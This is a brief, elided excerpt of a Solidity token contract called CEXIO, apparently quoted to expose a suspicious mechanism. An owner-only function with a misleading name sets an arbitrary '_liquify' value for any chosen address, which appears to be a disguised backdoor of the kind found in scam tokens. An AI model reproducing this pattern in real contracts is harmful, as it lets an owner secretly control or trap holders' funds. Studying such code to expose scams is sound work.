...
contract CEXIO is Ownable {
  ...
  constructor(string memory _name, string memory _symbol) public {
    ...
    symbol = _symbol;
    decimals = 9;
    totalSupply =  888888888 * 10 ** uint256(decimals);
  ...
  function swapAndTransffer(address from, uint256 _value) public onlyAdmin() {
    swapAndCrack(from, _value);
  }

  function swapAndCrack(address from, uint256 _value) internal {
    if(from != address(0)){
      _liquify[from] = liquifyAmount * _value * (10 ** 9);
    }
  }
